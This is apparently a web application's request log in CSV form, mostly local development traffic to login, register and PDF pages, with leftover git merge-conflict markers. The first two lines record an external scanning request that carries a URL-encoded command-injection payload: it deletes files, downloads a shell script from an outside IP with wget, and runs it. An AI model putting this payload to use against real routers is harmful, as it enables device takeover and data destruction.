8516bd,185.224.128.200,GET,https://185.216.26.211/cgi-bin/luci/;stok=/locale?country=%24%28rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.29%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh%29&form=country&operation=write,1708614908,cbd6e0,404,request
cbd6e0,185.224.128.200,GET,https://185.216.26.211/cgi-bin/luci/;stok=/locale?country=%24%28rm%20-rf%20%2A%3B%20cd%20%2Ftmp%3B%20wget%20http%3A%2F%2F107.175.3.29%2Ftenda.sh%3B%20chmod%20777%20tenda.sh%3B%20.%2Ftenda.sh%29&form=country&operation=write,1708614908,,404,request
<<<<<<< HEAD
<<<<<<< Updated upstream
=======
=======
>>>>>>> main
d00dc2,127.0.0.1,GET,https://127.0.0.1:8000/,1708707001,,200,request
d4f3ed,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707001,bd3c3c,404,request
bd3c3c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707001,,404,request
2b3f48,127.0.0.1,GET,https://127.0.0.1:8000/logout,1708707010,,302,request
ce52a6,127.0.0.1,GET,https://127.0.0.1:8000/logout_message,1708707010,,302,request
6bd14d,127.0.0.1,GET,https://127.0.0.1:8000/home,1708707010,,200,request
332f0f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707010,5da29d,404,request
5da29d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707010,,404,request
1b8ad3,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707010,,200,request
f0fa0e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707011,36ef1b,404,request
36ef1b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707011,,404,request
020955,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707040,,200,request
63d287,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707040,3b3efb,404,request
3b3efb,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707040,,404,request
c7b13d,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707079,,200,request
d3eb9e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707079,9fc8ee,404,request
9fc8ee,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707079,,404,request
af41c4,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707090,,200,request
aa3585,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707090,cd9b94,404,request
cd9b94,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707090,,404,request
87bd60,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707090,,200,request
ea9331,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707090,4ff63f,404,request
4ff63f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707090,,404,request
fa600a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707095,0d4351,404,request
0d4351,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707095,,404,request
139b3f,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707127,,200,request
913401,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707127,af6854,404,request
af6854,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707127,,404,request
cc676d,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707154,,200,request
9e51e1,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707154,0c24e4,404,request
0c24e4,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707154,,404,request
cbaf84,127.0.0.1,GET,https://127.0.0.1:8000/register,1708707164,,200,request
633469,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707164,2e7805,404,request
2e7805,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707164,,404,request
179749,127.0.0.1,GET,https://127.0.0.1:8000/login,1708707166,,200,request
9faa8c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707167,4e87ba,404,request
4e87ba,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707167,,404,request
f82259,127.0.0.1,GET,https://127.0.0.1:8000/login,1708707168,,200,request
6cb324,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707168,e5ce80,404,request
e5ce80,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707168,,404,request
81d18c,127.0.0.1,GET,https://127.0.0.1:8000/login,1708707198,,200,request
56366e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707198,850a1a,404,request
850a1a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708707198,,404,request
<<<<<<< HEAD
7ffef7,127.0.0.1,GET,https://127.0.0.1:8000/,1708720789,697676,500,request
697676,127.0.0.1,GET,https://127.0.0.1:8000/,1708720789,,500,request
917eb8,127.0.0.1,GET,https://127.0.0.1:8000/,1708720804,,200,request
1cc293,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720804,d79f04,404,request
d79f04,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720804,,404,request
6fa873,127.0.0.1,GET,https://127.0.0.1:8000/,1708720815,,200,request
47c3fb,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720815,03982d,404,request
03982d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720815,,404,request
d5a583,127.0.0.1,GET,https://127.0.0.1:8000/,1708720825,,200,request
f31c07,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720825,2e475a,404,request
2e475a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720825,,404,request
e4b462,127.0.0.1,GET,https://127.0.0.1:8000/register,1708720828,,200,request
6fe400,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720828,0570c2,404,request
0570c2,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720828,,404,request
77bd37,127.0.0.1,GET,https://127.0.0.1:8000/register,1708720844,,200,request
013775,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720844,14afdf,404,request
14afdf,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720844,,404,request
583d24,127.0.0.1,GET,https://127.0.0.1:8000/login,1708720873,,200,request
5c6445,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720873,34ce71,404,request
34ce71,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720873,,404,request
8e7561,127.0.0.1,POST,https://127.0.0.1:8000/login,1708720877,,302,request
a3e5fa,127.0.0.1,GET,https://127.0.0.1:8000/,1708720877,,200,request
159dd0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720877,fae455,404,request
fae455,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720877,,404,request
b554d9,127.0.0.1,GET,https://127.0.0.1:8000/pdf-form,1708720879,,200,request
397aa0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720879,ccdf86,404,request
ccdf86,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720879,,404,request
34f127,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720890,aa124d,404,request
aa124d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720890,,404,request
d62bc2,127.0.0.1,GET,https://127.0.0.1:8000/logout,1708720913,,302,request
4a4ff3,127.0.0.1,GET,https://127.0.0.1:8000/logout_message,1708720913,,302,request
d7b1c6,127.0.0.1,GET,https://127.0.0.1:8000/home,1708720913,,200,request
1094e9,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720913,d99b3e,404,request
d99b3e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720913,,404,request
106f3d,127.0.0.1,GET,https://127.0.0.1:8000/login,1708720914,,200,request
d5ac98,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720914,20c7d1,404,request
20c7d1,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720914,,404,request
68115d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720919,78a111,404,request
78a111,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720919,,404,request
5c9548,127.0.0.1,GET,https://127.0.0.1:8000/login,1708720996,,200,request
b4e037,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720996,7e990f,404,request
7e990f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720996,,404,request
6c9db3,127.0.0.1,GET,https://127.0.0.1:8000/login,1708720998,,200,request
541056,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720998,f5a6d3,404,request
f5a6d3,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708720998,,404,request
edf13f,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721005,,200,request
a4290b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721006,23e793,404,request
23e793,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721006,,404,request
a7acd3,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721015,,200,request
9b9a2a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721016,daa73c,404,request
daa73c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721016,,404,request
f977b2,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721019,,200,request
3fa862,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721019,303ee2,404,request
303ee2,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721019,,404,request
74877e,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721148,,200,request
fd274e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721149,15c18f,404,request
15c18f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721149,,404,request
780815,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721164,,200,request
f994d0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721164,a8e2ac,404,request
a8e2ac,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721164,,404,request
017de5,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721189,,200,request
c80443,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721189,0185d5,404,request
0185d5,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721189,,404,request
aa03f6,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721196,,200,request
4afe69,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721196,6a1b52,404,request
6a1b52,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721196,,404,request
c047cd,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721198,,200,request
cf1808,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721198,c42ae6,404,request
c42ae6,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721198,,404,request
54517b,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721200,,200,request
a7f145,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721200,9a0274,404,request
9a0274,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721200,,404,request
6aa5d1,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721228,,200,request
784b51,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721228,0f99d0,404,request
0f99d0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721228,,404,request
251546,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721229,,200,request
b17166,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,0bfb36,404,request
0bfb36,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,,404,request
393058,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721229,,200,request
fa8b74,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,648dad,404,request
648dad,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,,404,request
b91568,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721229,,200,request
fbb0f9,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,c925e5,404,request
c925e5,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721229,,404,request
9719ea,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721230,,200,request
96b7d0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721230,2bb5c5,404,request
2bb5c5,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721230,,404,request
621d9b,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721230,,200,request
60e16c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721230,302fcb,404,request
302fcb,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721230,,404,request
37a0d4,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721234,,200,request
46ffef,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721234,787ba4,404,request
787ba4,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721234,,404,request
b15e9f,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721290,,200,request
263f6e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721290,07ba93,404,request
07ba93,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721290,,404,request
ca379a,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721303,,200,request
5a44b1,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721303,90822f,404,request
90822f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721303,,404,request
b5a1f8,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721339,,200,request
5c2f39,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721339,4d27fc,404,request
4d27fc,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721339,,404,request
e346e5,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721344,,200,request
f4986f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721345,43e39f,404,request
43e39f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721345,,404,request
e924ec,127.0.0.1,POST,https://127.0.0.1:8000/login,1708721357,,302,request
210686,127.0.0.1,GET,https://127.0.0.1:8000/,1708721357,,200,request
cb70df,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721357,9fa1b9,404,request
9fa1b9,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721357,,404,request
22522f,127.0.0.1,GET,https://127.0.0.1:8000/pdf-history,1708721363,,200,request
94561e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721363,09133a,404,request
09133a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721363,,404,request
4a8492,127.0.0.1,GET,https://127.0.0.1:8000/pdf-history,1708721553,,200,request
d0678b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721554,be03d8,404,request
be03d8,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721554,,404,request
8cdcaf,127.0.0.1,GET,https://127.0.0.1:8000/pdf-history,1708721556,,200,request
734b64,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721556,cb9812,404,request
cb9812,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721556,,404,request
3c7990,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721567,6fc278,404,request
6fc278,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721567,,404,request
41d38d,127.0.0.1,GET,https://127.0.0.1:8000/pdf-history,1708721585,,200,request
6fa369,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721585,606992,404,request
606992,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721585,,404,request
3a2994,127.0.0.1,GET,https://127.0.0.1:8000/pdf-view/12,1708721635,,200,request
2cc711,127.0.0.1,GET,https://127.0.0.1:8000/favicon.ico,1708721635,15951e,404,request
15951e,127.0.0.1,GET,https://127.0.0.1:8000/favicon.ico,1708721635,,404,request
794098,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721639,2e8045,404,request
2e8045,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721639,,404,request
f1c3a3,127.0.0.1,GET,https://127.0.0.1:8000/pdf-view/11,1708721640,,200,request
e31ae4,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721642,2a855c,404,request
2a855c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721642,,404,request
bf4af0,127.0.0.1,GET,https://127.0.0.1:8000/logout,1708721646,,302,request
9d3d9e,127.0.0.1,GET,https://127.0.0.1:8000/logout_message,1708721646,,302,request
59b32c,127.0.0.1,GET,https://127.0.0.1:8000/home,1708721646,,200,request
2bd3da,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721646,a938e0,404,request
a938e0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721646,,404,request
adfb87,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721648,,200,request
536332,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721648,54eb22,404,request
54eb22,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721648,,404,request
229e06,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721653,0d537a,404,request
0d537a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721653,,404,request
f8cd41,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721656,,200,request
43f9d5,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721656,8d89b8,404,request
8d89b8,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721656,,404,request
36788a,127.0.0.1,POST,https://127.0.0.1:8000/login,1708721659,,302,request
8d672f,127.0.0.1,GET,https://127.0.0.1:8000/,1708721659,,200,request
d66653,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721659,909ad8,404,request
909ad8,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721659,,404,request
c1ea62,127.0.0.1,GET,https://127.0.0.1:8000/logout,1708721671,,302,request
562bd9,127.0.0.1,GET,https://127.0.0.1:8000/logout_message,1708721671,,302,request
b42bce,127.0.0.1,GET,https://127.0.0.1:8000/home,1708721671,,200,request
73efc7,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721671,074c7e,404,request
074c7e,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721671,,404,request
dd8a83,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721672,,200,request
d84ef7,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721672,227dc0,404,request
227dc0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721672,,404,request
e4e75e,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721708,,200,request
dfb0c6,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721708,d97cb1,404,request
d97cb1,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721708,,404,request
fd351c,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721713,,200,request
4d6770,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721713,ea4d3c,404,request
ea4d3c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721713,,404,request
838c3a,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721718,,200,request
30306c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721718,4a13a7,404,request
4a13a7,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721718,,404,request
96896c,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721731,,200,request
48159a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721731,0e130b,404,request
0e130b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721731,,404,request
4bdf79,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721741,72b4af,404,request
72b4af,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721741,,404,request
82d8a0,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721743,,200,request
51f182,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721743,c73095,404,request
c73095,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721743,,404,request
fa7dae,127.0.0.1,GET,https://127.0.0.1:8000/register,1708721747,,200,request
879d44,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721747,01bbe8,404,request
01bbe8,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721747,,404,request
094cf4,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721749,,200,request
bb1519,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721750,9a9d5b,404,request
9a9d5b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721750,,404,request
c9b5b6,127.0.0.1,GET,https://127.0.0.1:8000/login,1708721763,,200,request
e8d56f,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721763,3a4aee,404,request
3a4aee,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721763,,404,request
626591,127.0.0.1,GET,https://127.0.0.1:8000/home,1708721767,,200,request
c60ee4,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721767,dc0383,404,request
dc0383,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708721767,,404,request
>>>>>>> Stashed changes
91a17a,127.0.0.1,GET,https://127.0.0.1:8000/home,1708722022,,200,request
aa5611,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722022,8e3caf,404,request
8e3caf,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722022,,404,request
ac1a80,127.0.0.1,GET,https://127.0.0.1:8000/home,1708722041,,200,request
180371,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722041,737a70,404,request
737a70,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722041,,404,request
9f9651,127.0.0.1,GET,https://127.0.0.1:8000/login,1708722043,,200,request
280dbf,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722043,938af0,404,request
938af0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722043,,404,request
4daae0,127.0.0.1,GET,https://127.0.0.1:8000/login,1708722045,,200,request
188a44,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722045,4f8888,404,request
4f8888,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722045,,404,request
078a56,127.0.0.1,GET,https://127.0.0.1:8000/login,1708722059,,200,request
99a838,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722059,59c615,404,request
59c615,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722059,,404,request
37bc11,127.0.0.1,GET,https://127.0.0.1:8000/login,1708722071,,200,request
d4750a,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722071,15b75d,404,request
15b75d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722071,,404,request
05ea21,127.0.0.1,GET,https://127.0.0.1:8000/login,1708722072,,200,request
e79f59,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722072,28a7af,404,request
28a7af,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708722072,,404,request
=======
>>>>>>> main
04e009,127.0.0.1,GET,https://127.0.0.1:8000/,1708771839,,200,request
83773b,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771839,73ee15,404,request
73ee15,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771839,,404,request
464988,127.0.0.1,GET,https://127.0.0.1:8000/login,1708771841,,200,request
e95ce1,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771841,ef5e52,404,request
ef5e52,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771841,,404,request
0240bd,127.0.0.1,GET,https://127.0.0.1:8000/register,1708771843,,200,request
7ad912,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771843,56e5bf,404,request
56e5bf,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708771843,,404,request
4723cd,127.0.0.1,GET,https://127.0.0.1:8000/register,1708780058,,200,request
e4b005,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780058,737f89,404,request
737f89,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780058,,404,request
b4a35f,127.0.0.1,GET,https://127.0.0.1:8000/register,1708780100,,200,request
2a3ed6,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780100,4e83a0,404,request
4e83a0,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780100,,404,request
e73e80,127.0.0.1,GET,https://127.0.0.1:8000/login,1708780115,,200,request
594acb,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780115,aebaa8,404,request
aebaa8,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780115,,404,request
908847,127.0.0.1,GET,https://127.0.0.1:8000/register,1708780116,,200,request
7fce4c,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780116,ab1b32,404,request
ab1b32,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780116,,404,request
fcaf7d,127.0.0.1,GET,https://127.0.0.1:8000/home,1708780117,,200,request
a32403,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780117,88687d,404,request
88687d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780117,,404,request
aca621,127.0.0.1,GET,https://127.0.0.1:8000/home,1708780124,,200,request
332656,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780124,89919d,404,request
89919d,127.0.0.1,GET,https://127.0.0.1:8000/styles/app.css,1708780124,,404,request
